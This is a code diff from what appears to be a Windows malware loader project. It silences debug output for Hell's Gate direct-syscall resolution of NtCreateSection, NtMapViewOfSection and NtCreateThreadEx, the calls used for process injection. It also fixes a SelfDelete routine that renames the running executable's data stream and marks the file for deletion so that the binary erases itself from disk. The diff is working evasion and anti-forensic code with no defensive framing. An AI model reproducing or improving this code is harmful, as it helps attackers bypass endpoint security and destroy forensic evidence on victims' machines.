@@ -111,13 +111,13 @@ BOOL InitializeSyscalls() {
 		return FALSE;
 
 	printf("[+] DONE!\n");
-	printf("[+] SSN Of The NtCreateSection: %d\n", g_SyscallsTable.NtCreateSection.wSystemCall);
-	printf("[+] SSN Of The NtMapViewOfSection: %d\n", g_SyscallsTable.NtMapViewOfSection.wSystemCall);
-	printf("[+] SSN Of The NtUnmapViewOfSection: %d\n", g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
-	printf("[+] SSN Of The NtClose: %d\n", g_SyscallsTable.NtClose.wSystemCall);
-	printf("[+] SSN Of The NtCreateThreadEx: %d\n", g_SyscallsTable.NtCreateThreadEx.wSystemCall);
-	printf("[+] SSN Of The NtWaitForSingleObject: %d\n", g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
-	printf("[+] SSN Of The NtQuerySystemInformation: %d\n", g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
+	//printf("[+] SSN Of The NtCreateSection: %d\n", g_SyscallsTable.NtCreateSection.wSystemCall);
+	//printf("[+] SSN Of The NtMapViewOfSection: %d\n", g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+	//printf("[+] SSN Of The NtUnmapViewOfSection: %d\n", g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
+	//printf("[+] SSN Of The NtClose: %d\n", g_SyscallsTable.NtClose.wSystemCall);
+	//printf("[+] SSN Of The NtCreateThreadEx: %d\n", g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+	//printf("[+] SSN Of The NtWaitForSingleObject: %d\n", g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
+	//printf("[+] SSN Of The NtQuerySystemInformation: %d\n", g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
 
 	return TRUE;
 }
@@ -186,25 +186,29 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 }
 
 BOOL SelfDelete() {
-	LPCWSTR filePathBuffer = NULL;
-	DWORD filePathBufferSize = MAX_PATH * (DWORD)sizeof(WCHAR);
+	NTSTATUS status = 0;
 
-	filePathBuffer = (LPCWSTR)HeapAlloc(
+	DWORD dwFilePathBufferSize = MAX_PATH * 2;
+	LPWSTR pFilePathBuffer = (LPWSTR)HeapAlloc(
 		GetProcessHeap(),
 		HEAP_ZERO_MEMORY,
-		filePathBufferSize
+		dwFilePathBufferSize * sizeof(WCHAR)
 	);
-
-	// Get the path of the current executable
-	if (GetModuleFileNameW(NULL, filePathBuffer, filePathBufferSize) == 0) {
-		printf("[!] GetModuleFileNameW Failed With Error : 0x%0.8X \n", GetLastError());
+	if (!pFilePathBuffer) {
+		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
+	// Get the path of the current executable
+	if (!GetModuleFileNameW(NULL, pFilePathBuffer, dwFilePathBufferSize)) {
+		printf("[!] GetModuleFileNameW Failed With Error: 0x%0.8X \n", GetLastError());
+		return FALSE;
+	}
+	//wprintf(L"[+] FilePath: %ls\n", pFilePathBuffer);
+
 	// Opening a handle to the current file
-	HANDLE hFile = INVALID_HANDLE_VALUE;
-	hFile = CreateFileW(
-		filePathBuffer,
+	HANDLE hFile = CreateFileW(
+		pFilePathBuffer,
 		DELETE | SYNCHRONIZE,
 		FILE_SHARE_READ,
 		NULL,
@@ -212,18 +216,18 @@ BOOL SelfDelete() {
 		NULL,
 		NULL
 	);
-	if (!hFile) {
+	if (hFile == INVALID_HANDLE_VALUE) {
 		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
 	// The new data stream name
-	PFILE_RENAME_INFORMATION pFileRenameInfo = NULL;
 	PCWSTR NewStream = (PCWSTR)NEW_STREAM;
-	SIZE_T sFileRenameInfo = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
+	SIZE_T NewStreamSize = StringLengthW(NewStream) * sizeof(WCHAR);
+	SIZE_T sFileRenameInfo = sizeof(FILE_RENAME_INFO) + NewStreamSize;
 
 	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
-	pFileRenameInfo = (PFILE_RENAME_INFORMATION)HeapAlloc(
+	PFILE_RENAME_INFORMATION pFileRenameInfo = (PFILE_RENAME_INFORMATION)HeapAlloc(
 		GetProcessHeap(),
 		HEAP_ZERO_MEMORY,
 		sFileRenameInfo
@@ -234,33 +238,30 @@ BOOL SelfDelete() {
 	}
 
 	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
-	pFileRenameInfo->FileNameLength = sizeof(NewStream);
-	CopyMemoryEx(pFileRenameInfo->FileName, NewStream, sizeof(NewStream));
+	pFileRenameInfo->FileNameLength = (DWORD)NewStreamSize;
+	CopyMemory(pFileRenameInfo->FileName, NewStream, pFileRenameInfo->FileNameLength);
 
 	// Renaming the data stream
 	if (!SetFileInformationByHandle(
 		hFile,
 		FileRenameInfo,
 		pFileRenameInfo,
-		sFileRenameInfo
+		(DWORD)sFileRenameInfo
 	)) {
 		printf("[!] SetFileInformationByHandle [R] Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
 	// Closing the file handle
-	NTSTATUS status = 0;
 	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
-	if ((status = HellDescent(
-		hFile
-	)) != 0x0) {
+	if ((status = HellDescent(hFile)) != 0x0) {
 		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
 	// Re-opening a handle to the current file for refreshing
 	hFile = CreateFileW(
-		filePathBuffer,
+		pFilePathBuffer,
 		DELETE | SYNCHRONIZE,
 		FILE_SHARE_READ,
 		NULL,
@@ -268,29 +269,39 @@ BOOL SelfDelete() {
 		NULL,
 		NULL
 	);
-	if (!hFile) {
+	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
+		return TRUE;
+	}
+	if (hFile == INVALID_HANDLE_VALUE) {
 		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
+	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
 	FILE_DISPOSITION_INFO fileDispositionInfo = {
 		.DeleteFile = TRUE
 	};
 
 	// Marking for deletion after the file's handle is closed
-	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &fileDispositionInfo, sizeof(fileDispositionInfo))) {
+	if (!SetFileInformationByHandle(
+		hFile,
+		FileDispositionInfo,
+		&fileDispositionInfo,
+		sizeof(fileDispositionInfo)
+	)) {
 		printf("[!] SetFileInformationByHandle [D] Failed With Error : 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
 	// Close the handle for deleting the file
 	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
-	if ((status = HellDescent(
-		hFile
-	)) != 0x0) {
+	if ((status = HellDescent(hFile)) != 0x0) {
 		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
+
+	HeapFree(GetProcessHeap(), 0, pFilePathBuffer);
+	HeapFree(GetProcessHeap(), 0, pFileRenameInfo);
 
 	return TRUE;
 }
